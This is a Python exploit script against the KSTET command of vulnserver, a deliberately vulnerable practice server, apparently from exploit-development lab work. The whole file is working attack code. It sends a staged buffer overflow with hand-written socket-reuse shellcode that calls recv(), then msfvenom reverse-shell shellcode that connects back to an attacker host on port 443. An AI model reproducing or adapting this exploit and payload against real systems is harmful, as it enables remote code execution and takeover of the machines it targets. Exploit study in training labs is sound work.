import sys
import socket
import time

# Vulnerable command
command = "KSTET "
server = "172.16.203.5"
port = 9999

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.203.3 LPORT=443 -f python -v shell
# 324 bytes
shell =  ""
shell += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shell += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shell += "\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
shell += "\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
shell += "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
shell += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
shell += "\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
shell += "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
shell += "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
shell += "\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shell += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shell += "\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
shell += "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
shell += "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shell += "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xac\x10"
shell += "\xcb\x03\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
shell += "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shell += "\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
shell += "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
shell += "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
shell += "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shell += "\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
shell += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
shell += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
shell += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"


# 2000 bytes to crash vulnserver.exe
# Padding
setrecv = "\x41" * 2

# Creating socket descriptor = 0x0000007c
setrecv += "\x31\xc9"			# xor ecx, ecx
setrecv += "\x80\xc1\x7c"			# add cl, 0x7c
setrecv += "\x51"				# push ecx
setrecv += "\x89\xe7"			# mov edi, esp

# Move ESP out of the way
setrecv += "\x83\xec\x50"			# sub esp, 0x50

# Flags = 0x00000000
setrecv += "\x31\xd2"			        # xor edx,edx
setrecv += "\x52"				# push edx

# BufSize = 0x00000200
setrecv += "\x80\xc6\x02"			# add dh, 0x02
setrecv += "\x52"				# push edx

# Buffer = 0x00C0F9F0
setrecv += "\x54"				# push esp
setrecv += "\x5b"				# pop ebx
setrecv += "\x83\xc3\x4c"			# add ebx, 0x4c
setrecv += "\x53"				# push ebx

# Push socket descriptor onto the stack:
setrecv += "\xff\x37"				# push dword ptr ds:[edi]

# Calling W2_32.recv()
setrecv += "\xB8\x11\x2C\x25\x40"           	# mov eax, 0x40252C11
setrecv += "\xc1\xe8\x08"                   	# shr eax, 0x08
setrecv += "\xff\xd0"                           # call eax

# 70 byte offset to EIP
paddingeip = "\x41" * (70-len(setrecv))              # offset to EIP

eax = "\x0C\x10\x40\x00"       

#eax = "\xb1\x11\x50\x62"			     # 0x625011b1 jmp eax essfunc.dll
crash = "\x43" * (2000-len(setrecv+paddingeip+eax))  # remaining bytes to crash



s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))

## first stage
stage1 = command + setrecv + paddingeip + eax + crash
s.send(stage1)

time.sleep(2)

## second stage
stage2 = "\x90" * 40 + shell + "\x90" * (512- len(shell) - 40)
s.send(stage2)

s.close()
